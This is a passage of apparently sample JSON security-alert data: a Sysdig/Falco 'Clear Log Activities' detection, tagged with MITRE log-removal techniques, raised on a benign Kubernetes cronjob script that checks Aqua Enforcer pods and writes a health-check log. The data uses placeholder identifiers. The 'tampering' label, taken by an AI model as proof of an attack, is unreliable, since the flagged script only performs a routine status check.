policy.\",\"engine\":\"falco\",\"id\":\"183abcdefabcdef123456ffcccf0a338\",\"labels\":{\"aws.accountId\":\"012345678912\",\"aws.region\":\"us-west-2\",\"cloudProvider.account.id\":\"012345678912\",\"cloudProvider.name\":\"aws\",\"cloudProvider.region\":\"us-west-2\",\"container.image.digest\":\"sha256:b6980881cf440a3ae78dfa9c021aaa9bb66fc3c27b7120cfa2b2fa1c35ceaa20\",\"container.image.id\":\"4b0aebaeaf91\",\"container.image.repo\":\"docker.io/alpine/k8s\",\"container.image.tag\":\"1.26.2\",\"container.label.io.kubernetes.container.name\":\"test-aqua-enforcer\",\"container.label.io.kubernetes.pod.name\":\"aqua-enforcer-tester-12345678-abcde\",\"container.label.io.kubernetes.pod.namespace\":\"aqua\",\"container.name\":\"test-aqua-enforcer\",\"host.hostName\":\"ip-192-168-183-59.us-west-2.compute.internal\",\"host.mac\":\"01:00:5e:90:10:01\",\"kubernetes.cluster.name\":\"myclusterName\",\"kubernetes.cronJob.name\":\"aqua-enforcer-tester\",\"kubernetes.job.name\":\"aqua-enforcer-tester-29077920\",\"kubernetes.namespace.name\":\"aqua\",\"kubernetes.node.name\":\"i-00123456789012344\",\"kubernetes.pod.name\":\"aqua-enforcer-tester-12345678-abcde\",\"kubernetes.workload.name\":\"aqua-enforcer-tester\",\"kubernetes.workload.type\":\"cronjob\"},\"name\":\"Sysdig Runtime Notable Events\",\"originator\":\"policy\",\"rawEventCategory\":\"runtime\",\"rawEventOriginator\":\"linuxAgent\",\"severity\":5,\"source\":\"syscall\",\"sourceDetails\":{\"subType\":\"container\",\"type\":\"workload\"},\"timestamp\":1744675845328594200}",
                "provider": "syscall",
                "severity": 5,
                "type": [
                    "info"
                ]
            },
            "host": {
                "hostname": "ip-192-168-183-59.us-west-2.compute.internal",
                "mac": [
                    "01-00-5E-90-10-01"
                ],
                "name": "ip-192-168-183-59.us-west-2.compute.internal"
            },
            "message": "Log files tampered by bash with parent bash on test-aqua-enforcer under user root (evt.type=open fd.name=/var/log/enforcer_testjob.log evt.arg.path=<NA> evt.arg.name=/var/log/enforcer_testjob.log proc.exepath=/bin/bash proc.name=bash proc.pname=bash gparent=containerd-shim ggparent=systemd gggparent=<NA> image=docker.io/alpine/k8s user.name=root user.loginuid=-1 proc.cmdline=bash -c echo \"Checking Aqua Enforcer\"; sleep 5; timeout_seconds=420;  retry_interval=30;  max_retry_attempts=5;  start_time=$(date +%s); aqua_enforcer_pods=($(kubectl get pods -n aqua -l app=aqua-enforcer-ds --field-selector=status.phase==Running -o jsonpath=\"{.items[*].metadata.name}\"));.for aqua_enforcer_pod in \"${aqua_enforcer_pods[@]}\"; do..    while true; do.        current_time=$(date +%s); elapsed_time=$((current_time - start_time));..        if [ $elapsed_time -ge $timeout_seconds ]; then.            echo \"Error: Timeout reached while waiting for Aqua Enforcer pods to be ready.\";.            exit 1;.        fi;..        aqua_enforcer_pod_status=$(kubectl get pod $aqua_enforcer_pod -n aqua -o jsonpath=\"{.status.phase}\");..        if [[ $aqua_enforcer_pod_status != \"Running\" ]]; then.            echo \"LOG: Pod $aqua_enforcer_pod, $aqua_enforcer_pod_status\";.            sleep 15;.        else.            echo \"LOG: Pod $aqua_enforcer_pod, Running\";.            break;.        fi;.    done;.done;.for aqua_enforcer_pod in \"${aqua_enforcer_pods[@]}\"; do..    kubectl exec -n aqua $aqua_enforcer_pod -- timeout 30s /opt/aquasec/./slkaudit > /var/log/enforcer_testjob.log 2>&1.    grep -iq \"Successfully connected to gateway\" /var/log/enforcer_testjob.log.    grep_exit_code=$?;..    if [ $grep_exit_code -eq 0 ]; then.        echo \"Success: Aqua Enforcer pod $aqua_enforcer_pod is running and connected\";.    else.        echo \"Error: Aqua Enforcer pod $aqua_enforcer_pod failed to connect.\";.        echo \"Retrying for 5 minutes.\";..        start_time_retry=$(date +%s); retry_elapsed_time=0;..        while [ $retry_elapsed_time -lt $((retry_interval * max_retry_attempts)) ]; do.            kubectl exec -n aqua $aqua_enforcer_pod -- timeout 30s /opt/aquasec/./slkaudit > /var/log/enforcer_testjob.log 2>&1.            grep -iq \"Successfully connected to gateway\" /var/log/enforcer_testjob.log.            grep_exit_code=$?;..            if [ $grep_exit_code -eq 0 ]; then.                echo \"Success: Aqua Enforcer pod $aqua_enforcer_pod is running and connected after retry.\";.                break;.            else.                echo \"Retry: Aqua Enforcer pod $aqua_enforcer_pod failed to connect. Retrying in 30 seconds.\";.                sleep $retry_interval;.                retry_elapsed_time=$((retry_elapsed_time + retry_interval));.            fi;.        done;..        if [ $grep_exit_code -ne 0 ]; then.            echo \"Error: Retry limit reached. Aqua Enforcer pod $aqua_enforcer_pod still failed to connect.\";.            exit 1;.        fi;.    fi;.done;.echo \"Job completed successfully for all Aqua Enforcer pods.\"; exit 0; container.id=d2c32629a588 proc.pid=146490 proc.cwd=/apps/ proc.ppid=136656 proc.pcmdline=bash -c echo \"Checking Aqua Enforcer\"; sleep 5; timeout_seconds=420;  retry_interval=30;  max_retry_attempts=5;  start_time=$(date +%s); aqua_enforcer_pods=($(kubectl get pods -n aqua -l app=aqua-enforcer-ds --field-selector=status.phase==Running -o jsonpath=\"{.items[*].metadata.name}\"));.for aqua_enforcer_pod in \"${aqua_enforcer_pods[@]}\"; do..    while true; do.        current_time=$(date +%s); elapsed_time=$((current_time - start_time));..        if [ $elapsed_time -ge $timeout_seconds ]; then.            echo \"Error: Timeout reached while waiting for Aqua Enforcer pods to be ready.\";.            exit 1;.        fi;..        aqua_enforcer_pod_status=$(kubectl get pod $aqua_enforcer_pod -n aqua -o jsonpath=\"{.status.phase}\");..        if [[ $aqua_enforcer_pod_status != \"Running\" ]]; then.            echo \"LOG: Pod $aqua_enforcer_pod, $aqua_enforcer_pod_status\";.            sleep 15;.        else.            echo \"LOG: Pod $aqua_enforcer_pod, Running\";.            break;.        fi;.    done;.done;.for aqua_enforcer_pod in \"${aqua_enforcer_pods[@]}\"; do..    kubectl exec -n aqua $aqua_enforcer_pod -- timeout 30s /opt/aquasec/./slkaudit > /var/log/enforcer_testjob.log 2>&1.    grep -iq \"Successfully connected to gateway\" /var/log/enforcer_testjob.log.    grep_exit_code=$?;..    if [ $grep_exit_code -eq 0 ]; then.        echo \"Success: Aqua Enforcer pod $aqua_enforcer_pod is running and connected\";.    else.        echo \"Error: Aqua Enforcer pod $aqua_enforcer_pod failed to connect.\";.        echo \"Retrying for 5 minutes.\";..        start_time_retry=$(date +%s); retry_elapsed_time=0;..        while [ $retry_elapsed_time -lt $((retry_interval * max_retry_attempts)) ]; do.            kubectl exec -n aqua $aqua_enforcer_pod -- timeout 30s /opt/aquasec/./slkaudit > /var/log/enforcer_testjob.log 2>&1.            grep -iq \"Successfully connected to gateway\" /var/log/enforcer_testjob.log.            grep_exit_code=$?;..            if [ $grep_exit_code -eq 0 ]; then.                echo \"Success: Aqua Enforcer pod $aqua_enforcer_pod is running and connected after retry.\";.                break;.            else.                echo \"Retry: Aqua Enforcer pod $aqua_enforcer_pod failed to connect. Retrying in 30 seconds.\";.                sleep $retry_interval;.                retry_elapsed_time=$((retry_elapsed_time + retry_interval));.            fi;.        done;..        if [ $grep_exit_code -ne 0 ]; then.            echo \"Error: Retry limit reached. Aqua Enforcer pod $aqua_enforcer_pod still failed to connect.\";.            exit 1;.        fi;.    fi;.done;.echo \"Job completed successfully for all Aqua Enforcer pods.\"; exit 0; proc.sid=1 user.uid=0 user.loginname=<NA> group.gid=0 group.name=root container.name=test-aqua-enforcer)",
            "observer": {
                "product": "Sysdig Secure",
                "vendor": "Sysdig"
            },
            "orchestrator": {
                "cluster": {
                    "name": "myclusterName"
                },
                "namespace": "aqua",
                "resource": {
                    "name": "aqua-enforcer-tester-12345678-abcde",
                    "parent": {
                        "type": "cronjob"
                    }
                }
            },
            "process": {
                "command_line": "bash -c echo \"Checking Aqua Enforcer\"; sleep 5; timeout_seconds=420;  retry_interval=30;  max_retry_attempts=5;  start_time=$(date +%s); aqua_enforcer_pods=($(kubectl get pods -n aqua -l app=aqua-enforcer-ds --field-selector=status.phase==Running -o jsonpath=\"{.items[*].metadata.name}\"));.for aqua_enforcer_pod in \"${aqua_enforcer_pods[@]}\"; do..    while true; do.        current_time=$(date +%s); elapsed_time=$((current_time - start_time));..        if [ $elapsed_time -ge $timeout_seconds ]; then.            echo \"Error: Timeout reached while waiting for Aqua Enforcer pods to be ready.\";.            exit 1;.        fi;..        aqua_enforcer_pod_status=$(kubectl get pod $aqua_enforcer_pod -n aqua -o jsonpath=\"{.status.phase}\");..        if [[ $aqua_enforcer_pod_status != \"Running\" ]]; then.            echo \"LOG: Pod $aqua_enforcer_pod, $aqua_enforcer_pod_status\";.            sleep 15;.        else.            echo \"LOG: Pod $aqua_enforcer_pod, Running\";.            break;.        fi;.    done;.done;.for aqua_enforcer_pod in \"${aqua_enforcer_pods[@]}\"; do..    kubectl exec -n aqua $aqua_enforcer_pod -- timeout 30s /opt/aquasec/./slkaudit > /var/log/enforcer_testjob.log 2>&1.    grep -iq \"Successfully connected to gateway\" /var/log/enforcer_testjob.log.    grep_exit_code=$?;..    if [ $grep_exit_code -eq 0 ]; then.        echo \"Success: Aqua Enforcer pod $aqua_enforcer_pod is running and connected\";.    else.        echo \"Error: Aqua Enforcer pod $aqua_enforcer_pod failed to connect.\";.        echo \"Retrying for 5 minutes.\";..        start_time_retry=$(date +%s); retry_elapsed_time=0;..        while [ $retry_elapsed_time -lt $((retry_interval * max_retry_attempts)) ]; do.            kubectl exec -n aqua $aqua_enforcer_pod -- timeout 30s /opt/aquasec/./slkaudit > /var/log/enforcer_testjob.log 2>&1.            grep -iq \"Successfully connected to gateway\" /var/log/enforcer_testjob.log.            grep_exit_code=$?;..            if [ $grep_exit_code -eq 0 ]; then.                echo \"Success: Aqua Enforcer pod $aqua_enforcer_pod is running and connected after retry.\";.                break;.            else.                echo \"Retry: Aqua Enforcer pod $aqua_enforcer_pod failed to connect. Retrying in 30 seconds.\";.                sleep $retry_interval;.                retry_elapsed_time=$((retry_elapsed_time + retry_interval));.            fi;.        done;..        if [ $grep_exit_code -ne 0 ]; then.            echo \"Error: Retry limit reached. Aqua Enforcer pod $aqua_enforcer_pod still failed to connect.\";.            exit 1;.        fi;.    fi;.done;.echo \"Job completed successfully for all Aqua Enforcer pods.\"; exit 0;",
                "executable": "/bin/bash",
                "name": "bash",
                "parent": {
                    "command_line": "bash -c echo \"Checking Aqua Enforcer\"; sleep 5; timeout_seconds=420;  retry_interval=30;  max_retry_attempts=5;  start_time=$(date +%s); aqua_enforcer_pods=($(kubectl get pods -n aqua -l app=aqua-enforcer-ds --field-selector=status.phase==Running -o jsonpath=\"{.items[*].metadata.name}\"));.for aqua_enforcer_pod in \"${aqua_enforcer_pods[@]}\"; do..    while true; do.        current_time=$(date +%s); elapsed_time=$((current_time - start_time));..        if [ $elapsed_time -ge $timeout_seconds ]; then.            echo \"Error: Timeout reached while waiting for Aqua Enforcer pods to be ready.\";.            exit 1;.        fi;..        aqua_enforcer_pod_status=$(kubectl get pod $aqua_enforcer_pod -n aqua -o jsonpath=\"{.status.phase}\");..        if [[ $aqua_enforcer_pod_status != \"Running\" ]]; then.            echo \"LOG: Pod $aqua_enforcer_pod, $aqua_enforcer_pod_status\";.            sleep 15;.        else.            echo \"LOG: Pod $aqua_enforcer_pod, Running\";.            break;.        fi;.    done;.done;.for aqua_enforcer_pod in \"${aqua_enforcer_pods[@]}\"; do..    kubectl exec -n aqua $aqua_enforcer_pod -- timeout 30s /opt/aquasec/./slkaudit > /var/log/enforcer_testjob.log 2>&1.    grep -iq \"Successfully connected to gateway\" /var/log/enforcer_testjob.log.    grep_exit_code=$?;..    if [ $grep_exit_code -eq 0 ]; then.        echo \"Success: Aqua Enforcer pod $aqua_enforcer_pod is running and connected\";.    else.        echo \"Error: Aqua Enforcer pod $aqua_enforcer_pod failed to connect.\";.        echo \"Retrying for 5 minutes.\";..        start_time_retry=$(date +%s); retry_elapsed_time=0;..        while [ $retry_elapsed_time -lt $((retry_interval * max_retry_attempts)) ]; do.            kubectl exec -n aqua $aqua_enforcer_pod -- timeout 30s /opt/aquasec/./slkaudit > /var/log/enforcer_testjob.log 2>&1.            grep -iq \"Successfully connected to gateway\" /var/log/enforcer_testjob.log.            grep_exit_code=$?;..            if [ $grep_exit_code -eq 0 ]; then.                echo \"Success: Aqua Enforcer pod $aqua_enforcer_pod is running and connected after retry.\";.                break;.            else.                echo \"Retry: Aqua Enforcer pod $aqua_enforcer_pod failed to connect. Retrying in 30 seconds.\";.                sleep $retry_interval;.                retry_elapsed_time=$((retry_elapsed_time + retry_interval));.            fi;.        done;..        if [ $grep_exit_code -ne 0 ]; then.            echo \"Error: Retry limit reached. Aqua Enforcer pod $aqua_enforcer_pod still failed to connect.\";.            exit 1;.        fi;.    fi;.done;.echo \"Job completed successfully for all Aqua Enforcer pods.\"; exit 0;",
                    "name": "bash",
                    "pid": 136656
                },
                "pid": 146490,
                "working_directory": "/apps/"
            },
            "related": {
                "hash": [
                    "b6980881cf440a3ae78dfa9c021aaa9bb66fc3c27b7120cfa2b2fa1c35ceaa20"
                ],
                "hosts": [
                    "ip-192-168-183-59.us-west-2.compute.internal"
                ],
                "user": [
                    "root",
                    "0"
                ]
            },
            "rule": {
                "description": "This Notable Events policy contains rules which may indicate undesired behavior including security threats. The rules are more generalized than Threat Detection policies and may result in more noise. Tuning will likely be required for the events generated from this policy.",
                "name": "Clear Log Activities",
                "ruleset": "Sysdig Runtime Notable Events"
            },
            "sysdig": {
                "event": {
                    "actions": [
                        {
                            "after_event_ns": 30000000000,
                            "before_event_ns": 15000000000,
                            "is_successful": true,
                            "token": "0d0eefe8-a14b-1234-5678-abcdef7c4ce4",
                            "type": "capture"
                        }
                    ],
                    "category": "runtime",
                    "content": {
                        "fields": {
                            "container": {
                                "id": "d2abcdefa588",
                                "image": {
                                    "repository": "docker.io/alpine/k8s"
                                },
                                "name": "test-aqua-enforcer"
                            },
                            "evt": {
                                "type": "open"
                            },
                            "fd": {
                                "name": "/var/log/enforcer_testjob.log"
                            },
                            "group": {
                                "gid": "0",
                                "name": "root"
                            },
                            "proc": {
                                "cmdline": "bash -c echo \"Checking Aqua Enforcer\"; sleep 5; timeout_seconds=420;  retry_interval=30;  max_retry_attempts=5;  start_time=$(date +%s); aqua_enforcer_pods=($(kubectl get pods -n aqua -l app=aqua-enforcer-ds --field-selector=status.phase==Running -o jsonpath=\"{.items[*].metadata.name}\"));.for aqua_enforcer_pod in \"${aqua_enforcer_pods[@]}\"; do..    while true; do.        current_time=$(date +%s); elapsed_time=$((current_time - start_time));..        if [ $elapsed_time -ge $timeout_seconds ]; then.            echo \"Error: Timeout reached while waiting for Aqua Enforcer pods to be ready.\";.            exit 1;.        fi;..        aqua_enforcer_pod_status=$(kubectl get pod $aqua_enforcer_pod -n aqua -o jsonpath=\"{.status.phase}\");..        if [[ $aqua_enforcer_pod_status != \"Running\" ]]; then.            echo \"LOG: Pod $aqua_enforcer_pod, $aqua_enforcer_pod_status\";.            sleep 15;.        else.            echo \"LOG: Pod $aqua_enforcer_pod, Running\";.            break;.        fi;.    done;.done;.for aqua_enforcer_pod in \"${aqua_enforcer_pods[@]}\"; do..    kubectl exec -n aqua $aqua_enforcer_pod -- timeout 30s /opt/aquasec/./slkaudit > /var/log/enforcer_testjob.log 2>&1.    grep -iq \"Successfully connected to gateway\" /var/log/enforcer_testjob.log.    grep_exit_code=$?;..    if [ $grep_exit_code -eq 0 ]; then.        echo \"Success: Aqua Enforcer pod $aqua_enforcer_pod is running and connected\";.    else.        echo \"Error: Aqua Enforcer pod $aqua_enforcer_pod failed to connect.\";.        echo \"Retrying for 5 minutes.\";..        start_time_retry=$(date +%s); retry_elapsed_time=0;..        while [ $retry_elapsed_time -lt $((retry_interval * max_retry_attempts)) ]; do.            kubectl exec -n aqua $aqua_enforcer_pod -- timeout 30s /opt/aquasec/./slkaudit > /var/log/enforcer_testjob.log 2>&1.            grep -iq \"Successfully connected to gateway\" /var/log/enforcer_testjob.log.            grep_exit_code=$?;..            if [ $grep_exit_code -eq 0 ]; then.                echo \"Success: Aqua Enforcer pod $aqua_enforcer_pod is running and connected after retry.\";.                break;.            else.                echo \"Retry: Aqua Enforcer pod $aqua_enforcer_pod failed to connect. Retrying in 30 seconds.\";.                sleep $retry_interval;.                retry_elapsed_time=$((retry_elapsed_time + retry_interval));.            fi;.        done;..        if [ $grep_exit_code -ne 0 ]; then.            echo \"Error: Retry limit reached. Aqua Enforcer pod $aqua_enforcer_pod still failed to connect.\";.            exit 1;.        fi;.    fi;.done;.echo \"Job completed successfully for all Aqua Enforcer pods.\"; exit 0;",
                                "cwd": "/apps/",
                                "exepath": "/bin/bash",
                                "name": "bash",
                                "pcmdline": "bash -c echo \"Checking Aqua Enforcer\"; sleep 5; timeout_seconds=420;  retry_interval=30;  max_retry_attempts=5;  start_time=$(date +%s); aqua_enforcer_pods=($(kubectl get pods -n aqua -l app=aqua-enforcer-ds --field-selector=status.phase==Running -o jsonpath=\"{.items[*].metadata.name}\"));.for aqua_enforcer_pod in \"${aqua_enforcer_pods[@]}\"; do..    while true; do.        current_time=$(date +%s); elapsed_time=$((current_time - start_time));..        if [ $elapsed_time -ge $timeout_seconds ]; then.            echo \"Error: Timeout reached while waiting for Aqua Enforcer pods to be ready.\";.            exit 1;.        fi;..        aqua_enforcer_pod_status=$(kubectl get pod $aqua_enforcer_pod -n aqua -o jsonpath=\"{.status.phase}\");..        if [[ $aqua_enforcer_pod_status != \"Running\" ]]; then.            echo \"LOG: Pod $aqua_enforcer_pod, $aqua_enforcer_pod_status\";.            sleep 15;.        else.            echo \"LOG: Pod $aqua_enforcer_pod, Running\";.            break;.        fi;.    done;.done;.for aqua_enforcer_pod in \"${aqua_enforcer_pods[@]}\"; do..    kubectl exec -n aqua $aqua_enforcer_pod -- timeout 30s /opt/aquasec/./slkaudit > /var/log/enforcer_testjob.log 2>&1.    grep -iq \"Successfully connected to gateway\" /var/log/enforcer_testjob.log.    grep_exit_code=$?;..    if [ $grep_exit_code -eq 0 ]; then.        echo \"Success: Aqua Enforcer pod $aqua_enforcer_pod is running and connected\";.    else.        echo \"Error: Aqua Enforcer pod $aqua_enforcer_pod failed to connect.\";.        echo \"Retrying for 5 minutes.\";..        start_time_retry=$(date +%s); retry_elapsed_time=0;..        while [ $retry_elapsed_time -lt $((retry_interval * max_retry_attempts)) ]; do.            kubectl exec -n aqua $aqua_enforcer_pod -- timeout 30s /opt/aquasec/./slkaudit > /var/log/enforcer_testjob.log 2>&1.            grep -iq \"Successfully connected to gateway\" /var/log/enforcer_testjob.log.            grep_exit_code=$?;..            if [ $grep_exit_code -eq 0 ]; then.                echo \"Success: Aqua Enforcer pod $aqua_enforcer_pod is running and connected after retry.\";.                break;.            else.                echo \"Retry: Aqua Enforcer pod $aqua_enforcer_pod failed to connect. Retrying in 30 seconds.\";.                sleep $retry_interval;.                retry_elapsed_time=$((retry_elapsed_time + retry_interval));.            fi;.        done;..        if [ $grep_exit_code -ne 0 ]; then.            echo \"Error: Retry limit reached. Aqua Enforcer pod $aqua_enforcer_pod still failed to connect.\";.            exit 1;.        fi;.    fi;.done;.echo \"Job completed successfully for all Aqua Enforcer pods.\"; exit 0;",
                                "pid": 146490,
                                "pname": "bash",
                                "ppid": 136656,
                                "sid": "1"
                            },
                            "user": {
                                "name": "root",
                                "uid": "0"
                            }
                        },
                        "origin": "Sysdig",
                        "output": "Log files tampered by bash with parent bash on test-aqua-enforcer under user root (evt.type=open fd.name=/var/log/enforcer_testjob.log evt.arg.path=<NA> evt.arg.name=/var/log/enforcer_testjob.log proc.exepath=/bin/bash proc.name=bash proc.pname=bash gparent=containerd-shim ggparent=systemd gggparent=<NA> image=docker.io/alpine/k8s user.name=root user.loginuid=-1 proc.cmdline=bash -c echo \"Checking Aqua Enforcer\"; sleep 5; timeout_seconds=420;  retry_interval=30;  max_retry_attempts=5;  start_time=$(date +%s); aqua_enforcer_pods=($(kubectl get pods -n aqua -l app=aqua-enforcer-ds --field-selector=status.phase==Running -o jsonpath=\"{.items[*].metadata.name}\"));.for aqua_enforcer_pod in \"${aqua_enforcer_pods[@]}\"; do..    while true; do.        current_time=$(date +%s); elapsed_time=$((current_time - start_time));..        if [ $elapsed_time -ge $timeout_seconds ]; then.            echo \"Error: Timeout reached while waiting for Aqua Enforcer pods to be ready.\";.            exit 1;.        fi;..        aqua_enforcer_pod_status=$(kubectl get pod $aqua_enforcer_pod -n aqua -o jsonpath=\"{.status.phase}\");..        if [[ $aqua_enforcer_pod_status != \"Running\" ]]; then.            echo \"LOG: Pod $aqua_enforcer_pod, $aqua_enforcer_pod_status\";.            sleep 15;.        else.            echo \"LOG: Pod $aqua_enforcer_pod, Running\";.            break;.        fi;.    done;.done;.for aqua_enforcer_pod in \"${aqua_enforcer_pods[@]}\"; do..    kubectl exec -n aqua $aqua_enforcer_pod -- timeout 30s /opt/aquasec/./slkaudit > /var/log/enforcer_testjob.log 2>&1.    grep -iq \"Successfully connected to gateway\" /var/log/enforcer_testjob.log.    grep_exit_code=$?;..    if [ $grep_exit_code -eq 0 ]; then.        echo \"Success: Aqua Enforcer pod $aqua_enforcer_pod is running and connected\";.    else.        echo \"Error: Aqua Enforcer pod $aqua_enforcer_pod failed to connect.\";.        echo \"Retrying for 5 minutes.\";..        start_time_retry=$(date +%s); retry_elapsed_time=0;..        while [ $retry_elapsed_time -lt $((retry_interval * max_retry_attempts)) ]; do.            kubectl exec -n aqua $aqua_enforcer_pod -- timeout 30s /opt/aquasec/./slkaudit > /var/log/enforcer_testjob.log 2>&1.            grep -iq \"Successfully connected to gateway\" /var/log/enforcer_testjob.log.            grep_exit_code=$?;..            if [ $grep_exit_code -eq 0 ]; then.                echo \"Success: Aqua Enforcer pod $aqua_enforcer_pod is running and connected after retry.\";.                break;.            else.                echo \"Retry: Aqua Enforcer pod $aqua_enforcer_pod failed to connect. Retrying in 30 seconds.\";.                sleep $retry_interval;.                retry_elapsed_time=$((retry_elapsed_time + retry_interval));.            fi;.        done;..        if [ $grep_exit_code -ne 0 ]; then.            echo \"Error: Retry limit reached. Aqua Enforcer pod $aqua_enforcer_pod still failed to connect.\";.            exit 1;.        fi;.    fi;.done;.echo \"Job completed successfully for all Aqua Enforcer pods.\"; exit 0; container.id=d2c32629a588 proc.pid=146490 proc.cwd=/apps/ proc.ppid=136656 proc.pcmdline=bash -c echo \"Checking Aqua Enforcer\"; sleep 5; timeout_seconds=420;  retry_interval=30;  max_retry_attempts=5;  start_time=$(date +%s); aqua_enforcer_pods=($(kubectl get pods -n aqua -l app=aqua-enforcer-ds --field-selector=status.phase==Running -o jsonpath=\"{.items[*].metadata.name}\"));.for aqua_enforcer_pod in \"${aqua_enforcer_pods[@]}\"; do..    while true; do.        current_time=$(date +%s); elapsed_time=$((current_time - start_time));..        if [ $elapsed_time -ge $timeout_seconds ]; then.            echo \"Error: Timeout reached while waiting for Aqua Enforcer pods to be ready.\";.            exit 1;.        fi;..        aqua_enforcer_pod_status=$(kubectl get pod $aqua_enforcer_pod -n aqua -o jsonpath=\"{.status.phase}\");..        if [[ $aqua_enforcer_pod_status != \"Running\" ]]; then.            echo \"LOG: Pod $aqua_enforcer_pod, $aqua_enforcer_pod_status\";.            sleep 15;.        else.            echo \"LOG: Pod $aqua_enforcer_pod, Running\";.            break;.        fi;.    done;.done;.for aqua_enforcer_pod in \"${aqua_enforcer_pods[@]}\"; do..    kubectl exec -n aqua $aqua_enforcer_pod -- timeout 30s /opt/aquasec/./slkaudit > /var/log/enforcer_testjob.log 2>&1.    grep -iq \"Successfully connected to gateway\" /var/log/enforcer_testjob.log.    grep_exit_code=$?;..    if [ $grep_exit_code -eq 0 ]; then.        echo \"Success: Aqua Enforcer pod $aqua_enforcer_pod is running and connected\";.    else.        echo \"Error: Aqua Enforcer pod $aqua_enforcer_pod failed to connect.\";.        echo \"Retrying for 5 minutes.\";..        start_time_retry=$(date +%s); retry_elapsed_time=0;..        while [ $retry_elapsed_time -lt $((retry_interval * max_retry_attempts)) ]; do.            kubectl exec -n aqua $aqua_enforcer_pod -- timeout 30s /opt/aquasec/./slkaudit > /var/log/enforcer_testjob.log 2>&1.            grep -iq \"Successfully connected to gateway\" /var/log/enforcer_testjob.log.            grep_exit_code=$?;..            if [ $grep_exit_code -eq 0 ]; then.                echo \"Success: Aqua Enforcer pod $aqua_enforcer_pod is running and connected after retry.\";.                break;.            else.                echo \"Retry: Aqua Enforcer pod $aqua_enforcer_pod failed to connect. Retrying in 30 seconds.\";.                sleep $retry_interval;.                retry_elapsed_time=$((retry_elapsed_time + retry_interval));.            fi;.        done;..        if [ $grep_exit_code -ne 0 ]; then.            echo \"Error: Retry limit reached. Aqua Enforcer pod $aqua_enforcer_pod still failed to connect.\";.            exit 1;.        fi;.    fi;.done;.echo \"Job completed successfully for all Aqua Enforcer pods.\"; exit 0; proc.sid=1 user.uid=0 user.loginname=<NA> group.gid=0 group.name=root container.name=test-aqua-enforcer)",
                        "policy_id": "10011701",
                        "rule_name": "Clear Log Activities",
                        "rule_sub_type": 0,
                        "rule_tags": [
                            "host",
                            "container",
                            "file",
                            "FIM",
                            "SOC2",
                            "SOC2_CC6.7",
                            "PCI",
                            "PCI_DSS",
                            "PCI_DSS_10.5.5",
                            "NIST",
                            "NIST_800-171",
                            "NIST_800-171_3.14.6",
                            "NIST_800-171_3.3.1",
                            "NIST_800-171_3.3.2",
                            "NIST_800-171_3.4.5",
                            "NIST_800-53",
                            "NIST_800-53_AU-6(8)",
                            "NIST_800-53_CM-5",
                            "NIST_800-53_AU-2",
                            "NIST_800-53_AU-10",
                            "FedRAMP",
                            "FedRAMP_AU-10",
                            "FedRAMP_AU-2",
                            "ISO",
                            "ISO_27001",
                            "ISO_27001_A.18.1.3",
                            "HIPAA",
                            "HIPAA_164.308(a)",
                            "HIPAA_164.312(b)",
                            "HITRUST",
                            "HITRUST_CSF",
                            "HITRUST_CSF_01.p",
                            "HITRUST_CSF_01.s",
                            "HITRUST_CSF_06.i",
                            "HITRUST_CSF_09.aa",
                            "HITRUST_CSF_09.ab",
                            "HITRUST_CSF_09.ad",
                            "HITRUST_CSF_09.ae",
                            "HITRUST_CSF_09.b",
                            "HITRUST_CSF_09.x",
                            "HITRUST_CSF_09.y",
                            "HITRUST_CSF_10.d",
                            "HITRUST_CSF_10.j",
                            "HITRUST_CSF_10.k",
                            "MITRE",
                            "MITRE_TA0005_defense_evasion",
                            "MITRE_TA0040_impact",
                            "MITRE_T1070_indicator_removal_on_host",
                            "MITRE_T1485_data_destruction",
                            "MITRE_T1070.002_indicator_removal_clear_linux_or_mac_system_logs",
                            "MITRE_T1070.003_indicator_removal_clear_command_history",
                            "MITRE_T1070.004_indicator_removal_file_deletion",
                            "oss"
                        ],
                        "rule_type": 6,
                        "type": "workloadRuntimeDetection"
                    },
                    "description": "This Notable Events policy contains rules which may indicate undesired behavior including security threats. The rules are more generalized than Threat Detection policies and may result in more noise. Tuning will likely be required for the events generated from this policy.",
                    "engine": "falco",
                    "id": "183abcdefabcdef123456ffcccf0a338",
                    "labels": {
                        "aws": {
                            "account_id": "012345678912",
                            "region": "us-west-2"
                        },
                        "cloud_provider": {
                            "account": {
                                "id": "012345678912"
                            },
                            "name": "aws",
                            "region": "us-west-2"
                        },
                        "container": {
                            "image": {
                                "digest": "sha256:b6980881cf440a3ae78dfa9c021aaa9bb66fc3c27b7120cfa2b2fa1c35ceaa20",
                                "id": "4b0aebaeaf91",
                                "repo": "docker.io/alpine/k8s",
                                "tag": "1.26.2"
                            },
                            "label": {
                                "io": {
                                    "kubernetes": {
                                        "container": {
                                            "name": "test-aqua-enforcer"
                                        },
                                        "pod": {
                                            "name": "aqua-enforcer-tester-12345678-abcde",
                                            "namespace": "aqua"
                                        }
                                    }
                                }
                            },
                            "name": "test-aqua-enforcer"
                        },
                        "host": {
                            "host_name": "ip-192-168-183-59.us-west-2.compute.internal",
                            "mac": "01-00-5E-90-10-01"
                        },
                        "kubernetes": {
                            "cluster": {
                                "name": "myclusterName"
                            },
                            "cron_job": {
                                "name": "aqua-enforcer-tester"
                            },
                            "job": {
                                "name": "aqua-enforcer-tester-29077920"
                            },
                            "namespace": {
                                "name": "aqua"
                            },
                            "node": {
                                "name": "i-00123456789012344"
                            },
                            "pod": {
                                "name": "aqua-enforcer-tester-12345678-abcde"
                            },
                            "workload": {
                                "name": "aqua-enforcer-tester",
                                "type": "cronjob"
                            }
                        }
                    },
                    "name": "Sysdig Runtime Notable Events",
                    "originator": "policy",
                    "raw_event_category": "runtime",
                    "raw_event_originator": "linuxAgent",
                    "severity": 5,
                    "severity_value": "Medium",
                    "source": "syscall",
                    "source_details": {
                        "sub_type": "container",
                        "type": "workload"
                    },
                    "timestamp": "2025-04-15T00:10:45.3285942Z"
                }
            },
            "tags": [
                "preserve_duplicate_custom_fields"
            ],
            "threat": {
                "tactic": {
                    "id": [
                        "TA0005",
                        "TA0040"
                    ],
                    "name": [
                        "defense_evasion",
                        "impact"
                    ]
                },
                "technique": {
                    "id": [
                        "T1070",
                        "T1485"
                    ],
                    "name": [
                        "indicator_removal_on_host",
                        "data_destruction"
                    ],
                    "subtechnique": {
                        "id": [
                            "T1070.002",
                            "T1070.003",
                            "T1070.004"
                        ],
                        "name": [
                            "indicator_removal_clear_linux_or_mac_system_logs",
                            "indicator_removal_clear_command_history",
                            "indicator_removal_file_deletion"
                        ]
                    }
                }
            },
            "user": {
                "group": {
                    "id": "0",
                    "name": "root"
                },
                "id": "0",
                "name": "root"
            }
        },
        {
            "@timestamp": "2025-04-05T03:00:01.1159286Z",
            "cloud": {
                "account": {
